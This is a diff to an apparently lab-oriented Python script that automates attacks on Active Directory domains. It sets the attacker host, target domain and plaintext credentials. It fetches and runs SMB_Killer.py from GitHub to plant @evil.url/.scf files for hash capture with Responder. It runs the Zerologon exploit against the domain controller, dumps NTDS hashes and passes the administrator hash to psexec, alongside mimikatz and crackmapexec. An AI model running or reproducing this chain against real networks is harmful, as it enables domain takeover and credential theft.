@@ -11,14 +11,14 @@ from subprocess import call
 import urllib.request
 from os import system
 
-lhost = "192.168.0.29" #Your LHOST IP
+lhost = "10.10.0.16" #Your LHOST IP
 lport = "80" #Your web port (ex: 8080)
-inter = "eth0" #Your interface (ex: tun0 or eth0)
-domainip = "192.168.0.41" #Domain IP you are attacking if you do not know do a crackmapexec smb <rhost ip> -u fjdkasf -p /usr/share/wordlists/rockyou.txt and it will show you the domain name
-domain = "privesc" #Domain name
-username = "" #if you have a username for the domain you are attacking insert here
-userfile = "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt" #if you have a user file put here
-password = "" #if you have a password that goes along with the username put here
+inter = "tun0" #Your interface (ex: tun0 or eth0)
+domainip = "172.31.1.29" #Domain IP you are attacking if you do not know do a crackmapexec smb <rhost ip> -u fjdkasf -p /usr/share/wordlists/rockyou.txt and it will show you the domain name
+domain = "zero.csl" #Domain name
+username = "carrot" #if you have a username for the domain you are attacking insert here
+userfile = "" #if you have a user file put here
+password = "P@ssw0rd!" #if you have a password that goes along with the username put here
 passfile = "" #if you have a password file put here
 
 #Running multiple arguments is fine, howevever if running multiple and wanting to run Bloodhound make sure Bloodhound goes last...
@@ -38,6 +38,13 @@ parser.add_argument("-M", "--Mimikatz", action="store_true", help="Will run mimi
 parser.add_argument("-e", "--enum4linux", action="store_true", help="Will run enum4linux")
 parser.add_argument("-c", "--crack", action="store_true", help="Crack hashes with john the ripper")
 args = parser.parse_args()
+
+print("\033[1;31m   ____  ____________   ______                         ___    ____ ")
+print("\033[1;32m  / __ \/ ____/ ____/  / ____/___  __  ______ ___     /   |  / __ \ ")
+print("\033[1;33m / / / / / __/ /      / __/ / __ \/ / / / __ \`__ \  / /| | / / / /")
+print("\033[1;34m/ /_/ / /_/ / /___   / /___/ / / / /_/ / / / / / /  / ___ |/ /_/ / ")
+print("\033[1;35m\____/\____/\____/  /_____/_/ /_/\__,_/_/ /_/ /_/  /_/  |_/_____/  ")
+print("\033[1;36m                                                                   \033[1;39m")
 
 print("\033[1;33m Use -h to see the differnet arguments that can be ran\033[1;39m")
 
@@ -83,7 +90,7 @@ def scan():
 a = "exists, not downloading" #used for downloads do not delete
 b = "does not exist, downloading" #used for downloads do not delete
 
-def rust():
+def rustDownload():
 	ret_code = system("which rustscan")
 	url = "https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb"
 	if ret_code != 0:
@@ -94,7 +101,7 @@ def rust():
 		print("\033[1;32m Rustscan "+a) #green font
 		print("\033[1;39m ") #white font
 
-def blood():
+def bloodDownload():
 	ret_code = system("which bloodhound-python")
 	if ret_code != 0:
 		print("\033[1;31m bloodhound-python "+b)
@@ -103,7 +110,7 @@ def blood():
 		print("\033[1;32m bloodhound-python "+a)
 		print("\033[1;39m ")
 
-def enum():
+def enumDownload():
 	ret_code = system("which enum4linux")
 	if ret_code != 0:
 		print("\033[1;31m enum4linux "+b)
@@ -112,7 +119,7 @@ def enum():
 		print("\033[1;32m enum4linux "+a)
 		print("\033[1;39m ")
 
-def terminator():
+def terminatorDownload():
 	ret_code = system("which terminator")
 	if ret_code != 0:
 		print("\033[1;31m terminator "+b)
@@ -121,7 +128,7 @@ def terminator():
 		print("\033[1;32m terminator "+a)
 		print("\033[1;39m ")
 
-def crackmapexec():
+def crackmapexecDownload():
 	ret_code = system("which crackmapexec")
 	if ret_code != 0:
 		print("\033[1;31m crackmapexec "+b)
@@ -130,7 +137,7 @@ def crackmapexec():
 		print("\033[1;32m crackmapexec "+a)
 		print("\033[1;39m ")
 
-def ldapdomaindump():
+def ldapdomaindumpDownload():
 	ret_code = system("which ldapdomaindump")
 	if ret_code != 0:
 		print("\033[1;31m ldapdomaindump "+b)
@@ -139,7 +146,7 @@ def ldapdomaindump():
 		print("\033[1;32m ldapdomaindump "+a)
 		print("\033[1;39m ")
 
-def impacket():
+def impacketDownload():
 	ret_code = system("which impacket-smbserver")
 	if ret_code != 0:
 		print("\033[1;31m impacket "+b)
@@ -148,7 +155,7 @@ def impacket():
 		print("\033[1;32m impacket "+a)
 		print("\033[1;39m ")
 
-def kerbrute():
+def kerbruteDownload():
 	ret_code = system("locate kerbrute_linux_amd64")
 	if ret_code != 0:
 		print("\033[1;31m kerbrute_linux_amd64 "+b)
@@ -156,7 +163,7 @@ def kerbrute():
 		system("wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_386")
 	else:
 		print("\033[1;32m kerbrute_linux_amd64 "+a+ "\033[1;39m""")
-def neo4j():
+def neo4jDownload():
 	ret_code = system("which neo4j")
 	if ret_code !=0:
 		print("\033[1;31m neo4j "+b)
@@ -186,22 +193,29 @@ def bloodhound():
 	subprocess.call(['xterm', '-e', 'bloodhound'])
 	
 def smbkiller():
-	print("\033[1;31m Downloading newest version of smbkiller from github\033[1;39m")
-	url = "https://raw.githubusercontent.com/overgrowncarrot1/Invoke-Everything/main/SMB_Killer.py"
-	input("\033[1;32m File is downloaded, opening with nano, change the information on the top that is needed to be changed. Press enter to continue.\033[1;39m")
-	file = "SMB_Killer.py"
-	urllib.request.urlretrieve(url, file)
+	input("\033[1;31m RESPONDER WILL OPEN!!! CTRL-C OUT OF IT AND REOPEN AGAIN IN ANOTHER TERMINAL OR TAB!!! Press enter to continue\n")
+	ret_code = system("ls SMB_Killer.py")
+	if ret_code != 0:
+		print("")
+		print("\033[1;31m Downloading newest version of smbkiller from github\033[1;39m\n")
+		url = "https://raw.githubusercontent.com/overgrowncarrot1/Invoke-Everything/main/SMB_Killer.py"
+		file = "SMB_Killer.py"
+		urllib.request.urlretrieve(url, file)
+	print("")
+	input("\033[1;32m File is downloaded, change the information on the top that is needed to be changed. Press enter to continue.\033[1;39m\n")
 	system("nano SMB_Killer.py")
+	share = input("\033[1;31m Share folder to load @evil.xxx into?\033[1;39m\n")
 	ftype = input("\033[1;31m What file would you like to make, url, scf or xml? (ex: url)\033[1;39m\n")
 	if ftype == "url":
+		print("\033[1;31m Making @evil.url\033[1;39m")
 		system("python3 SMB_Killer.py -u")
 	elif ftype == "scf":
+		print("\033[1;31m Making @evil.scf\033[1;39m")
 		system("python3 SMB_Killer.py -s")
 	elif ftype == "xml":
 		system("python3 SMB_Killer.py -x")
-	else:
-		print("Not an option")
-
+	print("\033[1;33m Putting file into smb server, once done exit out of SMB Server, from there make sure you start up responder or smbserver\n")
+	
 def eternal():
 	system("nmap -p 445 --script=smb-vuln-* -Pn -T4 "+domainip+ " > eternal.txt")
 	search_word = "CVE:CVE-2017-0143"
@@ -259,6 +273,7 @@ def zero():
 	zerolog = system("python3 zerologon.py -exploit "+domainip)
 	system("cat zero-dc_zerologon_dump/zero-dc.ntds")
 	hashes = input("\033[1;31mCopy the NTLM hash for the administrator and paste below (ex: aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990)\n\033[1;39m")
+
 	system("impacket-psexec -hashes "+hashes+" administrator@"+domainip)
 
 def crackmapexec():
@@ -470,15 +485,15 @@ if args.scan == True:
 if args.SMBKiller == True:
 	smbkiller()
 if args.Download == True:
-	rust()
-	blood()
-	enum()
-	terminator()
-	crackmapexec()
-	ldapdomaindump()
-	impacket()
-	kerbrute()
-	neo4j()
+	rustDownload()
+	bloodDownload()
+	enumDownload()
+	terminatorDownload()
+	crackmapexecDownload()
+	ldapdomaindumpDownload()
+	impacketDownload()
+	kerbruteDownload()
+	neo4jDownload()
 if args.Zero == True:
 	zero()
 if args.Crackmapexec == True:
@@ -496,7 +511,15 @@ if args.crack == True:
 if args.enum4linux == True:
 	enum4linux()
 if args.attack == True:
-	download()
+	rustDownload()
+	bloodDownload()
+	enumDownload()
+	terminatorDownload()
+	crackmapexecDownload()
+	ldapdomaindumpDownload()
+	impacketDownload()
+	kerbruteDownload()
+	neo4jDownload()
 	scan()
 	enum4linux()
 	attack()
@@ -505,4 +528,6 @@ if args.attack == True:
 	crackmapexec()
 	mimikatz()
 	zero()
+	smbkiller()
+	responder()
 	bloodhound()
